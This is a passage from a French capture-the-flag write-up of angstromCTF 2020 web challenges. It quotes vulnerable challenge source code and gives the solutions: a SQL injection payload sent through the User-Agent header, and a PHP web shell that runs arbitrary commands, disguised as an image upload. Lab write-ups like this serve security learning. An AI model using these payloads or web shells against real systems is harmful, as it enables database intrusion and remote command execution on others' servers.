</span></span><span class=line><span class=cl>	<span class=n>u</span> <span class=o>=</span> <span class=n>request</span><span class=o>.</span><span class=n>headers</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s2>&#34;User-Agent&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>conn</span> <span class=o>=</span> <span class=n>mysql</span><span class=o>.</span><span class=n>connector</span><span class=o>.</span><span class=n>connect</span><span class=p>(</span><span class=n>pool_name</span><span class=o>=</span><span class=s2>&#34;poolofagents&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>					<span class=n>pool_size</span><span class=o>=</span><span class=mi>16</span><span class=p>,</span>
</span></span><span class=line><span class=cl>					<span class=o>**</span><span class=n>dbconfig</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>cursor</span> <span class=o>=</span> <span class=n>conn</span><span class=o>.</span><span class=n>cursor</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=k>for</span> <span class=n>r</span> <span class=ow>in</span> <span class=n>cursor</span><span class=o>.</span><span class=n>execute</span><span class=p>(</span><span class=s2>&#34;SELECT * FROM Agents WHERE UA=&#39;</span><span class=si>%s</span><span class=s2>&#39;&#34;</span><span class=o>%</span><span class=p>(</span><span class=n>u</span><span class=p>),</span> <span class=n>multi</span><span class=o>=</span><span class=kc>True</span><span class=p>):</span>
</span></span><span class=line><span class=cl>		<span class=k>if</span> <span class=n>r</span><span class=o>.</span><span class=n>with_rows</span><span class=p>:</span>
</span></span><span class=line><span class=cl>			<span class=n>res</span> <span class=o>=</span> <span class=n>r</span><span class=o>.</span><span class=n>fetchall</span><span class=p>()</span>
</span></span><span class=line><span class=cl>			<span class=n>conn</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
</span></span><span class=line><span class=cl>			<span class=k>break</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=nb>len</span><span class=p>(</span><span class=n>res</span><span class=p>)</span> <span class=o>==</span> <span class=mi>0</span><span class=p>:</span>
</span></span><span class=line><span class=cl>		<span class=k>return</span> <span class=n>render_template</span><span class=p>(</span><span class=s2>&#34;login.html&#34;</span><span class=p>,</span> <span class=n>msg</span><span class=o>=</span><span class=s2>&#34;stop! you&#39;re not allowed in here &gt;:)&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=nb>len</span><span class=p>(</span><span class=n>res</span><span class=p>)</span> <span class=o>&gt;</span> <span class=mi>1</span><span class=p>:</span>
</span></span><span class=line><span class=cl>		<span class=k>return</span> <span class=n>render_template</span><span class=p>(</span><span class=s2>&#34;login.html&#34;</span><span class=p>,</span> <span class=n>msg</span><span class=o>=</span><span class=s2>&#34;hey! close, but no bananananananananana!!!! (there are many secret agents of course)&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=k>return</span> <span class=n>render_template</span><span class=p>(</span><span class=s2>&#34;login.html&#34;</span><span class=p>,</span> <span class=n>msg</span><span class=o>=</span><span class=s2>&#34;Welcome, </span><span class=si>%s</span><span class=s2>&#34;</span><span class=o>%</span><span class=p>(</span><span class=n>res</span><span class=p>[</span><span class=mi>0</span><span class=p>][</span><span class=mi>0</span><span class=p>]))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s1>&#39;__main__&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>	<span class=n>app</span><span class=o>.</span><span class=n>run</span><span class=p>(</span><span class=s1>&#39;0.0.0.0&#39;</span><span class=p>)</span>
</span></span></code></pre></div><p>La <em>difficulté</em> est qu&rsquo;il faut que le résultat de la requête comporte plus d&rsquo;un résultat. Ce que nous permet de faire le payload suivant: <code>'OR 1 LIMIT 2,1 #</code>.</p><p><img class=lazyload src=/svg/loading.min.svg data-src=/posts/wu_angstrom_20/angstrom_2020_agent_flag.png data-srcset="/posts/wu_angstrom_20/angstrom_2020_agent_flag.png, /posts/wu_angstrom_20/angstrom_2020_agent_flag.png 1.5x, /posts/wu_angstrom_20/angstrom_2020_agent_flag.png 2x" data-sizes=auto alt=/posts/wu_angstrom_20/angstrom_2020_agent_flag.png title=Challenge width=920 height=369></p><p>Flag <code>actf{nyoom_1_4m_sp33d}</code></p><h2 id=defunds-crypt>Defund&rsquo;s Crypt</h2><blockquote><p><strong>DESCRIPTION</strong>: One year since defund&rsquo;s descent. One crypt. One void to fill. Clam must do it, <a href=https://crypt.2020.chall.actf.co/ target=_blank rel="noopener noreffer">and so must you</a>.</p></blockquote><p>On est redirigé vers une page nous proposant d&rsquo;upload une image.<br>Lorsque j&rsquo;ai inspecté la page, il est indiqué que les sources de la page se situe sur <strong>/src</strong> et que la flag est contenu dans le fichier <strong>/flag.txt</strong> sur le filesystem.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=c>&lt;!-- Defund was a big fan of open source so head over to /src.php --&gt;</span>
</span></span><span class=line><span class=cl><span class=c>&lt;!-- Also I have a flag in the filesystem at /flag.txt but too bad you can&#39;t read it --&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>h1</span><span class=p>&gt;</span>Defund&#39;s Crypt<span class=p>&lt;</span><span class=nt>span</span> <span class=na>class</span><span class=o>=</span><span class=s>&#34;small&#34;</span><span class=p>&gt;</span>o<span class=p>&lt;/</span><span class=nt>span</span><span class=p>&gt;&lt;/</span><span class=nt>h1</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>p</span><span class=p>&gt;</span>You must leave behind a memory lest you be forgotten forever.<span class=p>&lt;/</span><span class=nt>p</span><span class=p>&gt;</span>        <span class=p>&lt;</span><span class=nt>img</span> <span class=na>src</span><span class=o>=</span><span class=s>&#34;crypt.jpg&#34;</span> <span class=na>height</span><span class=o>=</span><span class=s>&#34;300&#34;</span><span class=p>/&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>form</span> <span class=na>method</span><span class=o>=</span><span class=s>&#34;POST&#34;</span> <span class=na>action</span><span class=o>=</span><span class=s>&#34;/&#34;</span> <span class=na>autocomplete</span><span class=o>=</span><span class=s>&#34;off&#34;</span> <span class=na>spellcheck</span><span class=o>=</span><span class=s>&#34;false&#34;</span> <span class=na>enctype</span><span class=o>=</span><span class=s>&#34;multipart/form-data&#34;</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=p>&lt;</span><span class=nt>p</span><span class=p>&gt;</span>Leave a memory:<span class=p>&lt;/</span><span class=nt>p</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=p>&lt;</span><span class=nt>input</span> <span class=na>type</span><span class=o>=</span><span class=s>&#34;file&#34;</span> <span class=na>id</span><span class=o>=</span><span class=s>&#34;imgfile&#34;</span> <span class=na>name</span><span class=o>=</span><span class=s>&#34;imgfile&#34;</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=p>&lt;</span><span class=nt>label</span> <span class=na>for</span><span class=o>=</span><span class=s>&#34;imgfile&#34;</span> <span class=na>id</span><span class=o>=</span><span class=s>&#34;imglbl&#34;</span><span class=p>&gt;</span>Choose an image...<span class=p>&lt;/</span><span class=nt>label</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=p>&lt;</span><span class=nt>input</span> <span class=na>type</span><span class=o>=</span><span class=s>&#34;submit&#34;</span> <span class=na>value</span><span class=o>=</span><span class=s>&#34;Descend&#34;</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>form</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>script</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=nx>imgfile</span><span class=p>.</span><span class=nx>oninput</span> <span class=o>=</span> <span class=nx>_</span> <span class=p>=&gt;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nx>imgfile</span><span class=p>.</span><span class=nx>classList</span><span class=p>.</span><span class=nx>add</span><span class=p>(</span><span class=s2>&#34;satisfied&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nx>imglbl</span><span class=p>.</span><span class=nx>innerText</span> <span class=o>=</span> <span class=nx>imgfile</span><span class=p>.</span><span class=nx>files</span><span class=p>[</span><span class=mi>0</span><span class=p>].</span><span class=nx>name</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>};</span>
</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>script</span><span class=p>&gt;</span>
</span></span></code></pre></div><p>Le code source de la page d&rsquo;accueil est ci-dessous:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;!</span><span class=nx>DOCTYPE</span> <span class=nx>html</span><span class=o>&gt;</span>
</span></span><span class=line><span class=cl><span class=o>&lt;</span><span class=nx>html</span><span class=o>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=o>&lt;</span><span class=nx>head</span><span class=o>&gt;</span>
</span></span><span class=line><span class=cl>        <span class=o>&lt;</span><span class=nx>meta</span> <span class=nx>charset</span><span class=o>=</span><span class=s2>&#34;UTF-8&#34;</span><span class=o>&gt;</span>
</span></span><span class=line><span class=cl>        <span class=o>&lt;</span><span class=nx>meta</span> <span class=nx>name</span><span class=o>=</span><span class=s2>&#34;viewport&#34;</span> <span class=nx>content</span><span class=o>=</span><span class=s2>&#34;width=device-width,initial-scale=1&#34;</span><span class=o>&gt;</span>
</span></span><span class=line><span class=cl>        <span class=o>&lt;</span><span class=nx>link</span> <span class=nx>href</span><span class=o>=</span><span class=s2>&#34;https://fonts.googleapis.com/css?family=Inconsolata|Special+Elite&amp;display=swap&#34;</span> <span class=nx>rel</span><span class=o>=</span><span class=s2>&#34;stylesheet&#34;</span><span class=o>&gt;</span>
</span></span><span class=line><span class=cl>        <span class=o>&lt;</span><span class=nx>link</span> <span class=nx>rel</span><span class=o>=</span><span class=s2>&#34;stylesheet&#34;</span> <span class=nx>href</span><span class=o>=</span><span class=s2>&#34;/style.css&#34;</span><span class=o>&gt;</span>
</span></span><span class=line><span class=cl>        <span class=o>&lt;</span><span class=nx>title</span><span class=o>&gt;</span><span class=nx>Defund</span><span class=s1>&#39;s Crypt&lt;/title&gt;
</span></span></span><span class=line><span class=cl><span class=s1>    &lt;/head&gt;
</span></span></span><span class=line><span class=cl><span class=s1>    &lt;body&gt;
</span></span></span><span class=line><span class=cl><span class=s1>        &lt;!-- Defund was a big fan of open source so head over to /src.php --&gt;
</span></span></span><span class=line><span class=cl><span class=s1>        &lt;!-- Also I have a flag in the filesystem at /flag.txt but too bad you can&#39;</span><span class=nx>t</span> <span class=nx>read</span> <span class=nx>it</span> <span class=o>--&gt;</span>
</span></span><span class=line><span class=cl>        <span class=o>&lt;</span><span class=nx>h1</span><span class=o>&gt;</span><span class=nx>Defund</span><span class=s1>&#39;s Crypt&lt;span class=&#34;small&#34;&gt;o&lt;/span&gt;&lt;/h1&gt;
</span></span></span><span class=line><span class=cl><span class=s1>        &lt;?php
</span></span></span><span class=line><span class=cl><span class=s1>            if ($_SERVER[&#34;REQUEST_METHOD&#34;] === &#34;POST&#34;) {
</span></span></span><span class=line><span class=cl><span class=s1>                // I just copy pasted this from the PHP site then modified it a bit
</span></span></span><span class=line><span class=cl><span class=s1>                // I&#39;</span><span class=nx>m</span> <span class=k>not</span> <span class=nx>gonna</span> <span class=nx>put</span> <span class=nx>myself</span> <span class=nx>through</span> <span class=nx>the</span> <span class=nx>hell</span> <span class=nx>of</span> <span class=nx>learning</span> <span class=nx>PHP</span> <span class=nx>to</span> <span class=nx>write</span> <span class=nx>one</span> <span class=nx>lousy</span> <span class=nx>angstrom</span> <span class=nx>chall</span>
</span></span><span class=line><span class=cl>                <span class=k>try</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                    <span class=k>if</span> <span class=p>(</span>
</span></span><span class=line><span class=cl>                        <span class=o>!</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_FILES</span><span class=p>[</span><span class=s1>&#39;imgfile&#39;</span><span class=p>][</span><span class=s1>&#39;error&#39;</span><span class=p>])</span> <span class=o>||</span>
</span></span><span class=line><span class=cl>                        <span class=nx>is_array</span><span class=p>(</span><span class=nv>$_FILES</span><span class=p>[</span><span class=s1>&#39;imgfile&#39;</span><span class=p>][</span><span class=s1>&#39;error&#39;</span><span class=p>])</span>
</span></span><span class=line><span class=cl>                    <span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                        <span class=k>throw</span> <span class=k>new</span> <span class=nx>RuntimeException</span><span class=p>(</span><span class=s1>&#39;The crypt rejects you.&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                    <span class=p>}</span>
</span></span><span class=line><span class=cl>                    <span class=k>switch</span> <span class=p>(</span><span class=nv>$_FILES</span><span class=p>[</span><span class=s1>&#39;imgfile&#39;</span><span class=p>][</span><span class=s1>&#39;error&#39;</span><span class=p>])</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                        <span class=k>case</span> <span class=nx>UPLOAD_ERR_OK</span><span class=o>:</span>
</span></span><span class=line><span class=cl>                            <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                        <span class=k>case</span> <span class=nx>UPLOAD_ERR_NO_FILE</span><span class=o>:</span>
</span></span><span class=line><span class=cl>                            <span class=k>throw</span> <span class=k>new</span> <span class=nx>RuntimeException</span><span class=p>(</span><span class=s1>&#39;You must leave behind a memory lest you be forgotten forever.&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                        <span class=k>case</span> <span class=nx>UPLOAD_ERR_INI_SIZE</span><span class=o>:</span>
</span></span><span class=line><span class=cl>                        <span class=k>case</span> <span class=nx>UPLOAD_ERR_FORM_SIZE</span><span class=o>:</span>
</span></span><span class=line><span class=cl>                            <span class=k>throw</span> <span class=k>new</span> <span class=nx>RuntimeException</span><span class=p>(</span><span class=s1>&#39;People can only remember so much.&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                        <span class=k>default</span><span class=o>:</span>
</span></span><span class=line><span class=cl>                            <span class=k>throw</span> <span class=k>new</span> <span class=nx>RuntimeException</span><span class=p>(</span><span class=s1>&#39;The crypt rejects you.&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                    <span class=p>}</span>
</span></span><span class=line><span class=cl>                    <span class=k>if</span> <span class=p>(</span><span class=nv>$_FILES</span><span class=p>[</span><span class=s1>&#39;imgfile&#39;</span><span class=p>][</span><span class=s1>&#39;size&#39;</span><span class=p>]</span> <span class=o>&gt;</span> <span class=mi>1000000</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                        <span class=k>throw</span> <span class=k>new</span> <span class=nx>RuntimeException</span><span class=p>(</span><span class=s1>&#39;People can only remember so much..&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                    <span class=p>}</span>
</span></span><span class=line><span class=cl>                    <span class=nv>$finfo</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>finfo</span><span class=p>(</span><span class=nx>FILEINFO_MIME_TYPE</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                    <span class=k>if</span> <span class=p>(</span><span class=k>false</span> <span class=o>===</span> <span class=nv>$ext</span> <span class=o>=</span> <span class=nx>array_search</span><span class=p>(</span>
</span></span><span class=line><span class=cl>                        <span class=nv>$finfo</span><span class=o>-&gt;</span><span class=na>file</span><span class=p>(</span><span class=nv>$_FILES</span><span class=p>[</span><span class=s1>&#39;imgfile&#39;</span><span class=p>][</span><span class=s1>&#39;tmp_name&#39;</span><span class=p>]),</span>
</span></span><span class=line><span class=cl>                        <span class=k>array</span><span class=p>(</span>
</span></span><span class=line><span class=cl>                            <span class=s1>&#39;.jpg&#39;</span> <span class=o>=&gt;</span> <span class=s1>&#39;image/jpeg&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                            <span class=s1>&#39;.png&#39;</span> <span class=o>=&gt;</span> <span class=s1>&#39;image/png&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                            <span class=s1>&#39;.bmp&#39;</span> <span class=o>=&gt;</span> <span class=s1>&#39;image/bmp&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                        <span class=p>),</span>
</span></span><span class=line><span class=cl>                        <span class=k>true</span>
</span></span><span class=line><span class=cl>                    <span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                        <span class=k>throw</span> <span class=k>new</span> <span class=nx>RuntimeException</span><span class=p>(</span><span class=s2>&#34;Your memory isn&#39;t picturesque enough to be remembered.&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                    <span class=p>}</span>
</span></span><span class=line><span class=cl>                    <span class=k>if</span> <span class=p>(</span><span class=nx>strpos</span><span class=p>(</span><span class=nv>$_FILES</span><span class=p>[</span><span class=s2>&#34;imgfile&#34;</span><span class=p>][</span><span class=s2>&#34;name&#34;</span><span class=p>],</span> <span class=nv>$ext</span><span class=p>)</span> <span class=o>===</span> <span class=k>false</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                        <span class=k>throw</span> <span class=k>new</span> <span class=nx>RuntimeException</span><span class=p>(</span><span class=s2>&#34;The name of your memory doesn&#39;t seem to match its content.&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                    <span class=p>}</span>
</span></span><span class=line><span class=cl>                    <span class=nv>$bname</span> <span class=o>=</span> <span class=nx>basename</span><span class=p>(</span><span class=nv>$_FILES</span><span class=p>[</span><span class=s2>&#34;imgfile&#34;</span><span class=p>][</span><span class=s2>&#34;name&#34;</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>                    <span class=nv>$fname</span> <span class=o>=</span> <span class=nx>sprintf</span><span class=p>(</span><span class=s2>&#34;%s%s&#34;</span><span class=p>,</span> <span class=nx>sha1_file</span><span class=p>(</span><span class=nv>$_FILES</span><span class=p>[</span><span class=s2>&#34;imgfile&#34;</span><span class=p>][</span><span class=s2>&#34;tmp_name&#34;</span><span class=p>]),</span> <span class=nx>substr</span><span class=p>(</span><span class=nv>$bname</span><span class=p>,</span> <span class=nx>strpos</span><span class=p>(</span><span class=nv>$bname</span><span class=p>,</span> <span class=s2>&#34;.&#34;</span><span class=p>)));</span>
</span></span><span class=line><span class=cl>                    <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nx>move_uploaded_file</span><span class=p>(</span>
</span></span><span class=line><span class=cl>                        <span class=nv>$_FILES</span><span class=p>[</span><span class=s1>&#39;imgfile&#39;</span><span class=p>][</span><span class=s1>&#39;tmp_name&#39;</span><span class=p>],</span>
</span></span><span class=line><span class=cl>                        <span class=s2>&#34;./memories/&#34;</span> <span class=o>.</span> <span class=nv>$fname</span>
</span></span><span class=line><span class=cl>                    <span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                        <span class=k>throw</span> <span class=k>new</span> <span class=nx>RuntimeException</span><span class=p>(</span><span class=s1>&#39;Your memory failed to be remembered.&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                    <span class=p>}</span>
</span></span><span class=line><span class=cl>                    <span class=nx>http_response_code</span><span class=p>(</span><span class=mi>301</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                    <span class=nx>header</span><span class=p>(</span><span class=s2>&#34;Location: /memories/&#34;</span> <span class=o>.</span> <span class=nv>$fname</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                <span class=p>}</span> <span class=k>catch</span> <span class=p>(</span><span class=nx>RuntimeException</span> <span class=nv>$e</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                    <span class=k>echo</span> <span class=s2>&#34;&lt;p&gt;&#34;</span> <span class=o>.</span> <span class=nv>$e</span><span class=o>-&gt;</span><span class=na>getMessage</span><span class=p>()</span> <span class=o>.</span> <span class=s2>&#34;&lt;/p&gt;&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                <span class=p>}</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=cp>?&gt;</span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>        &lt;img src=&#34;crypt.jpg&#34; height=&#34;300&#34;/&gt;
</span></span></span><span class=line><span class=cl><span class=err>        &lt;form method=&#34;POST&#34; action=&#34;/&#34; autocomplete=&#34;off&#34; spellcheck=&#34;false&#34; enctype=&#34;multipart/form-data&#34;&gt;
</span></span></span><span class=line><span class=cl><span class=err>            &lt;p&gt;Leave a memory:&lt;/p&gt;
</span></span></span><span class=line><span class=cl><span class=err>            &lt;input type=&#34;file&#34; id=&#34;imgfile&#34; name=&#34;imgfile&#34;&gt;
</span></span></span><span class=line><span class=cl><span class=err>            &lt;label for=&#34;imgfile&#34; id=&#34;imglbl&#34;&gt;Choose an image...&lt;/label&gt;
</span></span></span><span class=line><span class=cl><span class=err>            &lt;input type=&#34;submit&#34; value=&#34;Descend&#34;&gt;
</span></span></span><span class=line><span class=cl><span class=err>        &lt;/form&gt;
</span></span></span><span class=line><span class=cl><span class=err>        &lt;script&gt;
</span></span></span><span class=line><span class=cl><span class=err>            imgfile.oninput = _ =&gt; {
</span></span></span><span class=line><span class=cl><span class=err>                imgfile.classList.add(&#34;satisfied&#34;);
</span></span></span><span class=line><span class=cl><span class=err>                imglbl.innerText = imgfile.files[0].name;
</span></span></span><span class=line><span class=cl><span class=err>            };
</span></span></span><span class=line><span class=cl><span class=err>        &lt;/script&gt;
</span></span></span><span class=line><span class=cl><span class=err>    &lt;/body&gt;
</span></span></span><span class=line><span class=cl><span class=err>&lt;/html&gt;
</span></span></span></code></pre></div><p>En gros, lors d&rsquo;un upload de fichier, il check si c&rsquo;est un fichier de type .png, .jpg ou .bmp avec la fonction <code>finfo_file</code> de PHP. Il check également que l&rsquo;extension du fichier correspond bien au type retourné par la fonction <code>finfo_file</code>. À partir de là, on suppose qu&rsquo;il va falloir injecté un script PHP camouflé dans une image, car la fonction <code>finfo_file</code> va vérifier le header du fichier pour déterminer son type.
Pour cela, j&rsquo;ai simplement pris une image qui traînais dans mes fichiers, j&rsquo;ai supprimé tout le contenu afin de ne garder que le header, et j&rsquo;ai ensuite renseigné le script PHP ci-dessous:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl>    <span class=k>echo</span> <span class=nx>system</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;command&#39;</span><span class=p>]);</span>
</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
</span></span></span></code></pre></div><p>Avec ce script, je suis capable d&rsquo;exécuter n&rsquo;importe quelle commande sur le filesystem en utilisant la paramètre <code>?commande=&lt;command></code> lors d&rsquo;une requête.</p><p><img class=lazyload src=/svg/loading.min.svg data-src=/posts/wu_angstrom_20/angstrom_2020_crypt.png data-srcset="/posts/wu_angstrom_20/angstrom_2020_crypt.png, /posts/wu_angstrom_20/angstrom_2020_crypt.png 1.5x, /posts/wu_angstrom_20/angstrom_2020_crypt.png 2x" data-sizes=auto alt=/posts/wu_angstrom_20/angstrom_2020_crypt.png title=Challenge width=1608 height=120></p><p>FLAG: <code>actf{th3_ch4ll3ng3_h4s_f4ll3n_but_th3_crypt_rem4ins}</code></p><h2 id=woooosh>Woooosh</h2><blockquote><p><strong>DESCRIPTION</strong>: Clam&rsquo;s tired of people hacking his sites so he spammed obfuscation on his <a href=https://woooosh.2020.chall.actf.co/ target=_blank rel="noopener noreffer">new game</a>. I have a feeling that behind that wall of obfuscated javascript there&rsquo;s still a vulnerable site though. Can you get enough points to get the flag? I also found the <a href=https://files.actf.co/188f275d11eb621ad7308044f1af1bcbddc353335773e9201b4af88d9306b745/index.js target=_blank rel="noopener noreffer">backend source</a>.</p><p>Second instance: <a href=https://wooooosh.2020.chall.actf.co/ target=_blank rel="noopener noreffer">https://wooooosh.2020.chall.actf.co/</a></p></blockquote><p>Dans ce challenge, on doit réussir à marquer plus de 20 points sur le jeu. Le but étant de parvenir à trouver le cercle au milieu d&rsquo;un amas de carré le plus de fois possible dans un temps imparti.</p><p><img class=lazyload src=/svg/loading.min.svg data-src=/posts/wu_angstrom_20/angstrom_2020_woosh.png data-srcset="/posts/wu_angstrom_20/angstrom_2020_woosh.png, /posts/wu_angstrom_20/angstrom_2020_woosh.png 1.5x, /posts/wu_angstrom_20/angstrom_2020_woosh.png 2x" data-sizes=auto alt=/posts/wu_angstrom_20/angstrom_2020_woosh.png title=Challenge width=717 height=569></p><p>Le Javascript étant obfusqué, les sources nous sont fournis dans l&rsquo;énoncé du challenge.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=kr>const</span> <span class=nx>express</span> <span class=o>=</span> <span class=nx>require</span><span class=p>(</span><span class=s2>&#34;express&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>exphbs</span> <span class=o>=</span> <span class=nx>require</span><span class=p>(</span><span class=s2>&#34;express-handlebars&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>socket</span> <span class=o>=</span> <span class=nx>require</span><span class=p>(</span><span class=s2>&#34;socket.io&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>path</span> <span class=o>=</span> <span class=nx>require</span><span class=p>(</span><span class=s2>&#34;path&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>http</span> <span class=o>=</span> <span class=nx>require</span><span class=p>(</span><span class=s2>&#34;http&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>morgan</span> <span class=o>=</span> <span class=nx>require</span><span class=p>(</span><span class=s2>&#34;morgan&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>app</span> <span class=o>=</span> <span class=nx>express</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>serv</span> <span class=o>=</span> <span class=nx>http</span><span class=p>.</span><span class=nx>createServer</span><span class=p>(</span><span class=nx>app</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>io</span> <span class=o>=</span> <span class=nx>socket</span><span class=p>.</span><span class=nx>listen</span><span class=p>(</span><span class=nx>serv</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>port</span> <span class=o>=</span> <span class=nx>process</span><span class=p>.</span><span class=nx>env</span><span class=p>.</span><span class=nx>PORT</span> <span class=o>||</span> <span class=mi>60600</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kd>function</span> <span class=nx>rand</span><span class=p>(</span><span class=nx>bound</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nb>Math</span><span class=p>.</span><span class=nx>floor</span><span class=p>(</span><span class=nb>Math</span><span class=p>.</span><span class=nx>random</span><span class=p>()</span> <span class=o>*</span> <span class=nx>bound</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kd>function</span> <span class=nx>genId</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kr>const</span> <span class=nx>chars</span> <span class=o>=</span> <span class=s2>&#34;abcdefghijklmnopqrstuvwxyz0123456789&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=k>new</span> <span class=nb>Array</span><span class=p>(</span><span class=mi>64</span><span class=p>).</span><span class=nx>fill</span><span class=p>(</span><span class=mi>0</span><span class=p>).</span><span class=nx>map</span><span class=p>(</span><span class=nx>v</span> <span class=p>=&gt;</span> <span class=nx>chars</span><span class=p>[</span><span class=nx>rand</span><span class=p>(</span><span class=nx>chars</span><span class=p>.</span><span class=nx>length</span><span class=p>)]).</span><span class=nx>join</span><span class=sb>``</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kd>function</span> <span class=nx>genShapes</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=k>new</span> <span class=nb>Array</span><span class=p>(</span><span class=mi>20</span><span class=p>).</span><span class=nx>fill</span><span class=p>(</span><span class=mi>0</span><span class=p>).</span><span class=nx>map</span><span class=p>(</span><span class=nx>v</span> <span class=p>=&gt;</span> <span class=p>({</span> <span class=nx>x</span><span class=o>:</span> <span class=nx>rand</span><span class=p>(</span><span class=mi>500</span><span class=p>),</span> <span class=nx>y</span><span class=o>:</span> <span class=nx>rand</span><span class=p>(</span><span class=mi>300</span><span class=p>)</span> <span class=p>}));</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
